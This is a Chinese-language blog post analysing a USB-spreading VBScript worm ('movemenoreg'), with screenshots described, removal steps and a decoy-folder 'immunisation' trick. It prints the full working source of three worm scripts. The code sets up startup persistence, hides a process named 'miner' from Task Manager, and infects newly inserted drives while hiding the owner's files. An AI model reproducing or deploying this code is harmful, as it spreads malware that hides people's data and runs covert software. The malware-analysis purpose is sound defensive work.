---
title: movemenoreg 利用U盘传播的VBS病毒分析及免疫
typora-root-url: movemenoreg-vbs-analysis
date: 2024-02-25 12:58:04
tags: 
- re
- malware
- virus
categories: Reverse
---

全文为了显示效果，所有vbscript的代码块标注的语言都是visual-basic，实际语言为vbscript

## 模拟感染U盘

在一台已受感染的计算机上插入U盘，可发现占用空间大小不变，但U盘中的文件“消失”，只有一个名为U盘名的快捷方式

![image-20240225112304927](image-20240225112304927.png)

双击打开，弹出了一个文件夹，里面是U盘原有的文件

![image-20240225112406085](image-20240225112406085.png)

可以看到路径为`N:\_`，我们大致推测U盘根目录下存在一个名为"_"的文件夹，已经被隐藏

## 显示隐藏文件

文件夹选项中取消勾选“隐藏受保护的操作系统文件(推荐)”，并且选择“显示隐藏的文件、文件夹和驱动器”

![image-20240225113003987](image-20240225113003987.png)

之后回到根目录可发现显示了三个隐藏的文件夹

![image-20240225113106219](image-20240225113106219.png)

System Volume Information是Windows生成的文件夹，并不需要在乎它

## 病毒流程分析

### 分析快捷方式

正常情况应该是执行根目录下的快捷方式，因为不显示隐藏文件时只有这一个文件可以被看到，于是我们从正常执行的路径逐步分析

右键属性，查看快捷方式栏

![image-20240225112554151](image-20240225112554151.png)

目标为：`%COMSPEC% /C .\WindowsServices\movemenoreg.vbs`

系统变量中`%COMSPEC%`指的是cmd.exe

![image-20240225112733288](image-20240225112733288.png)

也就是说目标为 `cmd.exe /C .\WindowsServices\movemenoreg.vbs`

实际上是运行了同级目录下`WindowsServices`文件夹内的`movemenoreg.vbs`文件，下面我们分析该脚本

### movemenoreg.vbs

#### 代码

代码内容如下

```vb
on error resume next
Dim  strPath, objws, objFile, strFolder, Target, destFolder, objDestFolder, AppData, ws, objmove, pfolder, objWinMgmt, colProcess, vaprocess
Set ws = WScript.CreateObject("WScript.Shell")

Target = "\WindowsServices"




'where are we?
strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
pfolder = objws.GetParentFolderName(strFolder)
ws.Run Chr(34) & pfolder & "\_" & Chr(34)


AppData = ws.ExpandEnvironmentStrings("%AppData%")



DestFolder = AppData & Target


if (not objws.folderexists(DestFolder)) then
	objws.CreateFolder DestFolder	
	Set objDestFolder = objws.GetFolder(DestFolder)
end if

Call moveandhide ("\helper.vbs")
Call moveandhide ("\installer.vbs")
Call moveandhide ("\movemenoreg.vbs")
Call moveandhide ("\WindowsServices.exe")
objDestFolder.Attributes = objDestFolder.Attributes + 39


sub moveandhide (name)
	if (not objws.fileexists(DestFolder & name)) then
		objws.CopyFile strFolder & name, DestFolder & "\"
		Set objmove = objws.GetFile(DestFolder & name)

		If not objmove.Attributes AND 39 then 
			objmove.Attributes = 0
			objmove.Attributes = objmove.Attributes + 39
		end if

	end if
end sub





Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")
Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

For Each objProcess In colProcess
	vaprocess = objProcess.CommandLine
		if instr(vaprocess, "helper.vbs") then
			WScript.quit
		End if
Next


ws.Run Chr(34) & DestFolder & "\helper.vbs" & Chr(34)


Set ws = Nothing

```

逐步进行分析

#### 展示U盘原有文件

首先下面的代码打开了存放原有文件的文件夹，也就是名为"_"的文件夹

```vb
'where are we?
strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
pfolder = objws.GetParentFolderName(strFolder)
ws.Run Chr(34) & pfolder & "\_" & Chr(34)
```

#### 感染本机

随后获取了%APPDATA%下的WindowsServices文件夹，并且将U盘内的几个vbs文件和一个exe文件复制到刚刚获取的目录中

```vb
Target = "\WindowsServices"

AppData = ws.ExpandEnvironmentStrings("%AppData%")



DestFolder = AppData & Target


if (not objws.folderexists(DestFolder)) then
	objws.CreateFolder DestFolder	
	Set objDestFolder = objws.GetFolder(DestFolder)
end if

Call moveandhide ("\helper.vbs")
Call moveandhide ("\installer.vbs")
Call moveandhide ("\movemenoreg.vbs")
Call moveandhide ("\WindowsServices.exe")
objDestFolder.Attributes = objDestFolder.Attributes + 39
```

下面是moveandhide函数的实现，大概是不存在就复制，复制后设置属性为隐藏

```vb
sub moveandhide (name)
	if (not objws.fileexists(DestFolder & name)) then
		objws.CopyFile strFolder & name, DestFolder & "\"
		Set objmove = objws.GetFile(DestFolder & name)

		If not objmove.Attributes AND 39 then 
			objmove.Attributes = 0
			objmove.Attributes = objmove.Attributes + 39
		end if

	end if
end sub
```

继续向下，可以看到查询了该系统上名为wscript.exe的进程，判断其命令行中是否存在helper.vbs的字样，如果不存在就会运行helper.vbs

这里包括上面的moveandhide都是为了使未感染的电脑感染该病毒，判断helper.vbs是为了不重复运行helper.vbs

```vb
Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")
Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

For Each objProcess In colProcess
	vaprocess = objProcess.CommandLine
		if instr(vaprocess, "helper.vbs") then
			WScript.quit
		End if
Next


ws.Run Chr(34) & DestFolder & "\helper.vbs" & Chr(34)


Set ws = Nothing
```

#### 小结

这个文件打开了存放U盘中原有文件的文件夹，然后将病毒文件复制到了当前的计算机上，这些文件都被设置了隐藏和系统属性，因此只设置显示隐藏文件是不能看到它们的，然后调用了helper.vbs文件，该文件执行结束

随后我们转到helper.vbs中

### helper.vbs

#### 代码

文件如下：

```vb
on error resume next
Dim ws, strPath, objws, objFile, strFolder, startupPath, MyScript, objWinMgmt, colProcess, vaprocess, miner, tskProcess, nkey, key
Set ws = WScript.CreateObject("WScript.Shell")


nkey = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder\helper.lnk"

Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")


strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
strPath = strFolder & "\"
startupPath = ws.SpecialFolders("startup")

miner = Chr(34) & strPath & "WindowsServices.exe" & Chr(34)

MyScript = "helper.vbs"


While True
	key = Empty
	key = ws.regread (nkey)
	If (not IsEmpty(key)) then
	
		ws.RegWrite nkey, 2, "REG_BINARY"	
	End if
	
	If (not objws.fileexists(startupPath & "\helper.lnk")) then
		Set link = ws.CreateShortcut(startupPath & "\helper.lnk")
		link.Description = "helper"
		link.TargetPath =chr(34) & strPath & "helper.vbs" & chr(34)
		link.WorkingDirectory = strPath
		link.Save
	End If

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

	call procheck(colProcess, "installer.vbs")

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%WindowsServices.exe%'")
	Set tskProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%Taskmgr.exe%'")

	if colProcess.count = 0 And tskProcess.count = 0  then

		ws.Run miner, 0
	
	ElseIf colProcess.count > 0 And tskProcess.count > 0 then

		For Each objProcess In colProcess
			ws.run "taskkill /PID " & objProcess.ProcessId , 0 
		Next
		
	end if
	WScript.Sleep 3000
Wend



'---------------------------------------------------------------------------------

sub procheck(checkme, procname)

For Each objProcess In checkme
	vaprocess = objProcess.CommandLine
	
		if instr(vaprocess, procname) then
			Exit sub
		End if
	
Next

ws.Run Chr(34) & strPath & procname & Chr(34)

end sub

'--------------------------------------------------------------------------------


```

主要代码是一个永远为真的循环

```vb
While True
	key = Empty
	key = ws.regread (nkey)
	If (not IsEmpty(key)) then
	
		ws.RegWrite nkey, 2, "REG_BINARY"	
	End if
	
	If (not objws.fileexists(startupPath & "\helper.lnk")) then
		Set link = ws.CreateShortcut(startupPath & "\helper.lnk")
		link.Description = "helper"
		link.TargetPath =chr(34) & strPath & "helper.vbs" & chr(34)
		link.WorkingDirectory = strPath
		link.Save
	End If

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

	call procheck(colProcess, "installer.vbs")

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%WindowsServices.exe%'")
	Set tskProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%Taskmgr.exe%'")

	if colProcess.count = 0 And tskProcess.count = 0  then

		ws.Run miner, 0
	
	ElseIf colProcess.count > 0 And tskProcess.count > 0 then

		For Each objProcess In colProcess
			ws.run "taskkill /PID " & objProcess.ProcessId , 0 
		Next
		
	end if
	WScript.Sleep 3000
Wend

```

#### 持久化

首先获取注册表`HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder\helper.lnk`，如果它不为空就向其写入二进制数据02，但是这里似乎获取是空的

```vb
nkey = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder\helper.lnk"

key = Empty
key = ws.regread (nkey)
If (not IsEmpty(key)) then
    ws.RegWrite nkey, 2, "REG_BINARY"	
End if
```

随后在Startup目录下创建一个快捷方式，连接到helper.vbs

```vb
strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
strPath = strFolder & "\"
startupPath = ws.SpecialFolders("startup")

If (not objws.fileexists(startupPath & "\helper.lnk")) then
    Set link = ws.CreateShortcut(startupPath & "\helper.lnk")
    link.Description = "helper"
    link.TargetPath =chr(34) & strPath & "helper.vbs" & chr(34)
    link.WorkingDirectory = strPath
    link.Save
End If
```

效果如下：

![image-20240225114842195](image-20240225114842195.png)

#### 运行恶意可执行文件

随后启动installer.vbs（如果它未在运行），判断WindowsServices.exe（病毒同目录下的可执行文件）是否在运行，同时也判断任务管理器是否在运行，如果都没有运行就启动WindowsServices.exe

如果运行WindowsServices.exe的同时也运行了任务管理器，就用taskkill结束WindowsServices.exe，防止被任务管理器发现异常进程

```vb
miner = Chr(34) & strPath & "WindowsServices.exe" & Chr(34)

Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

call procheck(colProcess, "installer.vbs")

Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%WindowsServices.exe%'")
Set tskProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%Taskmgr.exe%'")

if colProcess.count = 0 And tskProcess.count = 0  then

    ws.Run miner, 0

ElseIf colProcess.count > 0 And tskProcess.count > 0 then

    For Each objProcess In colProcess
        ws.run "taskkill /PID " & objProcess.ProcessId , 0 
    Next

end if
WScript.Sleep 3000
```

这里指向WindowsServices.exe的变量名为miner，可以推测脚本原意运行的是一个挖矿程序，但是当前获取到的样本中的可执行文件已经被前辈替换为0KB的文件了

procheck函数如下：

```vb
sub procheck(checkme, procname)

For Each objProcess In checkme
	vaprocess = objProcess.CommandLine
	
		if instr(vaprocess, procname) then
			Exit sub
		End if
	
Next

ws.Run Chr(34) & strPath & procname & Chr(34)

end sub
```

它检测了每个checkme进程的实例，它们的命令行是否存在procname，如果不存在就会运行procname指向的文件，该函数仅当procname指向的文件存在于病毒文件夹下才可正常运行

#### 小结

helper.vbs创建了自身的开机启动，并且保证病毒文件夹下的可执行文件是一直在运行的，同时检测任务管理器，确保可执行文件不被发现。循环中还运行了installer.vbs，下面转到该文件

### installer.vbs

#### 代码

```vb
on error resume next
DIM colEvents, objws, strComputer, objEvent, DestFolder, strFolder, Target, ws, objFile, objWMIService, DummyFolder, check, number, home, device, devicename, colProcess, vaprocess, objWinMgmt
strComputer = "."
Set ws = WScript.CreateObject("WScript.Shell")

Target = "\WindowsServices"


'where are we?
strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)




'Checking for USB instance
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colEvents = objWMIService.ExecNotificationQuery ("SELECT * FROM __InstanceOperationEvent WITHIN 1 WHERE " & "TargetInstance ISA 'Win32_LogicalDisk'")


Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")


While True

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")
	call procheck(colProcess, "helper.vbs")
	
	Set objEvent = colEvents.NextEvent
	
	
	
	If objEvent.TargetInstance.DriveType = 2  Then
		If objEvent.Path_.Class = "__InstanceCreationEvent" Then
			device = objEvent.TargetInstance.DeviceID
			devicename = objEvent.TargetInstance.VolumeName
			DestFolder = device & "\WindowsServices"
			DummyFolder = device & "\" & "_"
			if (not objws.folderexists(DestFolder)) then
				objws.CreateFolder DestFolder	
				Set objDestFolder = objws.GetFolder(DestFolder)
				objDestFolder.Attributes = objDestFolder.Attributes + 39
			end if
			
			Call moveandhide ("\helper.vbs")
			Call moveandhide ("\installer.vbs")
			Call moveandhide ("\movemenoreg.vbs")
			Call moveandhide ("\WindowsServices.exe")
			
			if (not objws.fileexists (device & devicename & ".lnk")) then
				Set link = ws.CreateShortcut(device & "\" & devicename & ".lnk")
				link.IconLocation = "%windir%\system32\SHELL32.dll, 7"
				link.TargetPath = "%COMSPEC%" 
				link.Arguments = "/C .\WindowsServices\movemenoreg.vbs"
				link.windowstyle = 7
				link.Save
			End If
				
				
			if (not objws.folderexists(DummyFolder)) then
				objws.CreateFolder DummyFolder	
				Set objDestFolder = objws.GetFolder(DummyFolder)
				objDestFolder.Attributes = objDestFolder.Attributes + 2 + 4
				End If
			set check = objws.getFolder(device)
			Call checker(check)
			
		End If
	End If
	

	
	
Wend





sub checker (path)
	set home = path.Files
	For Each file in home
		Select Case file.Name
			Case devicename & ".lnk"
				'nothings
			Case Else
				objws.MoveFile path & file.Name, DummyFolder & "\"
		End Select
		
	Next
	
	set home = path.SubFolders
	For Each home in home
		Select Case home
			Case path & "_"
				'nothings
			Case path & "WindowsServices"
				'nothings
			Case path & "System Volume Information"
				'nothings'
			Case Else
				objws. MoveFolder home, DummyFolder & "\"
		End Select
		
	Next
	
end sub


'------------------------------------------------------------


sub moveandhide (name)
	if (not objws.fileexists(DestFolder & name)) then
		objws.CopyFile strFolder & name, DestFolder & "\"
		Set objmove = objws.GetFile(DestFolder & name)

		If not objmove.Attributes AND 39 then 
			objmove.Attributes = 0
			objmove.Attributes = objmove.Attributes + 39
		end if

	end if
end sub



'------------------------------------------------------------


sub procheck(checkme, procname)

For Each objProcess In checkme
	vaprocess = objProcess.CommandLine
	
		if instr(vaprocess, procname) then
			Exit sub
		End if
	
Next
ws.Run Chr(34) & strFolder  & "\" & procname & Chr(34)
end sub
```

该函数部分代码是重用的，主要内容也是一个循环

```vb
While True

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")
	call procheck(colProcess, "helper.vbs")
	
	Set objEvent = colEvents.NextEvent
	If objEvent.TargetInstance.DriveType = 2  Then
		If objEvent.Path_.Class = "__InstanceCreationEvent" Then
			device = objEvent.TargetInstance.DeviceID
			devicename = objEvent.TargetInstance.VolumeName
			DestFolder = device & "\WindowsServices"
			DummyFolder = device & "\" & "_"
			if (not objws.folderexists(DestFolder)) then
				objws.CreateFolder DestFolder	
				Set objDestFolder = objws.GetFolder(DestFolder)
				objDestFolder.Attributes = objDestFolder.Attributes + 39
			end if
			
			Call moveandhide ("\helper.vbs")
			Call moveandhide ("\installer.vbs")
			Call moveandhide ("\movemenoreg.vbs")
			Call moveandhide ("\WindowsServices.exe")
			
			if (not objws.fileexists (device & devicename & ".lnk")) then
				Set link = ws.CreateShortcut(device & "\" & devicename & ".lnk")
				link.IconLocation = "%windir%\system32\SHELL32.dll, 7"
				link.TargetPath = "%COMSPEC%" 
				link.Arguments = "/C .\WindowsServices\movemenoreg.vbs"
				link.windowstyle = 7
				link.Save
			End If
				
				
			if (not objws.folderexists(DummyFolder)) then
				objws.CreateFolder DummyFolder	
				Set objDestFolder = objws.GetFolder(DummyFolder)
				objDestFolder.Attributes = objDestFolder.Attributes + 2 + 4
				End If
			set check = objws.getFolder(device)
			Call checker(check)
			
		End If
	End If
Wend
```

下面逐步分析

#### 确保helper.vbs的运行状态

首先是installer.vbs里检测helper.vbs的运行情况，保持它是运行的，我们知道helper.vbs中也有类似的代码，它的检测对象是installer.vbs，可以确定，它们互相检测对方的运行状态，保持两个vbs文件都在执行

```vb
Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")
call procheck(colProcess, "helper.vbs")
```

受感染机器中效果如下：

![image-20240225120002885](image-20240225120002885.png)

#### 感染新插入U盘

```vb
Set objEvent = colEvents.NextEvent
If objEvent.TargetInstance.DriveType = 2  Then
    If objEvent.Path_.Class = "__InstanceCreationEvent" Then
```

> __InstanceCreationEvent 系统类报告实例创建事件，这是一种内部事件，在将新实例添加到命名空间时生成。（来自MSDN）

DriveType代表Removable，这里判断是否为可移动存储设备，并且是刚刚插入（也就是__InstanceCreationEvent）

可以发现下面执行的内容都是针对接入系统的U盘

##### 复制病毒文件

接下来向U盘中复制病毒相关的文件

```vb
device = objEvent.TargetInstance.DeviceID
devicename = objEvent.TargetInstance.VolumeName
DestFolder = device & "\WindowsServices"
if (not objws.folderexists(DestFolder)) then
    objws.CreateFolder DestFolder	
    Set objDestFolder = objws.GetFolder(DestFolder)
    objDestFolder.Attributes = objDestFolder.Attributes + 39
end if

Call moveandhide ("\helper.vbs")
Call moveandhide ("\installer.vbs")
Call moveandhide ("\movemenoreg.vbs")
Call moveandhide ("\WindowsServices.exe")
```

创建U盘根目录下的快捷方式，它指向U盘里刚刚复制的movemenoreg.vbs

```vb
if (not objws.fileexists (device & devicename & ".lnk")) then
    Set link = ws.CreateShortcut(device & "\" & devicename & ".lnk")
    link.IconLocation = "%windir%\system32\SHELL32.dll, 7"
    link.TargetPath = "%COMSPEC%" 
    link.Arguments = "/C .\WindowsServices\movemenoreg.vbs"
    link.windowstyle = 7
    link.Save
End If
```

##### 隐藏原文件

随后在U盘下创建名为"_"的文件夹，下一步大概就是复制文件了

```vb
DummyFolder = device & "\" & "_"
if (not objws.folderexists(DummyFolder)) then
    objws.CreateFolder DummyFolder	
    Set objDestFolder = objws.GetFolder(DummyFolder)
    objDestFolder.Attributes = objDestFolder.Attributes + 2 + 4
    End If
set check = objws.getFolder(device)
Call checker(check)
```

让我们转到checker函数，可以看到判断文件名，除了刚刚创建了快捷方式都要移动到下划线文件夹中

```vb
sub checker (path)
	set home = path.Files
	For Each file in home
		Select Case file.Name
			Case devicename & ".lnk"
				'nothings
			Case Else
				objws.MoveFile path & file.Name, DummyFolder & "\"
		End Select
		
	Next
	
	set home = path.SubFolders
	For Each home in home
		Select Case home
			Case path & "_"
				'nothings
			Case path & "WindowsServices"
				'nothings
			Case path & "System Volume Information"
				'nothings'
			Case Else
				objws. MoveFolder home, DummyFolder & "\"
		End Select
		
	Next
	
end sub
```

随后是移动根目录下的文件夹，判断了“_”文件夹和“WindowsServices”文件夹，也判断了Windows操作系统创建的"System Volume Information"文件夹，它们是不被移动的，除了这些文件夹外都要移动到下划线文件夹中

#### 小结

installer.vbs确保了helper.vbs的运行状态，并且持续检测新插入的U盘，准备感染新插入的U盘

### 病毒运行流程总结

假定有一台未感染的机器和一个存在病毒的U盘，当我们毫无防备直接运行了U盘根目录下的快捷方式，movemenoreg.vbs被运行，它打开了存放有U盘原有文件的文件夹，并且将病毒文件复制到当前计算机上，随后是helper.vbs得到执行，它设置了开机启动，并保证恶意软件WindowsServices.exe的运行，还与installer.vbs互相检测，保证两个脚本都在运行，installer.vbs中时刻准备感染新接入的U盘，此时该台机器也被感染，再次有未感染的U盘插入，也会被感染病毒文件并隐藏文件，重复以上的传播流程

这里所有的vbs脚本都只实现了病毒的传播，真正的恶意文件应该是WindowsServices.exe，根据代码内的变量名猜测，该文件应该是挖矿病毒，但当前获取到的样本中的WindowsServices.exe可能已被学校的前辈替换，该病毒仅剩下传播过程

![image-20240225122352487](image-20240225122352487.png)

## 病毒的清除

### 受感染机器

首先执行`taskkill /f /im wscript.exe`，然后根据文章中的设置显示隐藏文件，在所有受感染的机器上删除`C:\Users\<用户名>\AppData\Roaming\`下的`WindowsServices`文件夹，删除文件`C:\Users\<用户名>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\helper.lnk`

### U盘

根据文章中的设置显示隐藏文件，删除`WindowsServices`文件夹和U盘根目录下的名为U盘名的快捷方式

![image-20240225123151648](image-20240225123151648.png)

`System Volume Information`不需要删除，这是Windows生成的文件夹

文件管理器地址栏中输入`<盘符>:\_`，其中是所有被隐藏的文件，将它们全部拷贝到U盘根目录下即可

## 病毒的免疫

在受感染机器上的免疫，最好的方式是使用杀毒软件，如果我们不希望使用这种方式，可以在`C:\Users\<用户名>\AppData\Roaming\`下创建名为`WindowsServices`的文件夹，在其中创建四个文件，名为helper.vbs、installer.vbs、movemenoreg.vbs、WindowsServices.exe，内容为空即可。注意需要打开后缀名显示

或者使用记事本另存为时，文件类型选择所有文件，文件名携带后缀名即可

![image-20240225123639534](image-20240225123639534.png)

最后得到如下目录：

![image-20240225123809360](image-20240225123809360.png)

此时这台机器已经实现了该病毒的免疫，双击受感染U盘的快捷方式也不会使该台机器得到感染，原理可参照本文章的病毒流程分析

U盘的免疫只能说买个有写入锁的U盘

## 参考资料

[__InstanceCreationEvent 类 - Win32 apps | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows/win32/wmisdk/--instancecreationevent)

[DriveType 枚举 (System.IO) | Microsoft Learn](https://learn.microsoft.com/zh-cn/dotnet/api/system.io.drivetype?view=net-7.0)

[VBScript - RegWrite Method (vbsedit.com)](https://www.vbsedit.com/html/678e6992-ddc4-4333-a78c-6415c9ebcc77.asp)



（完）
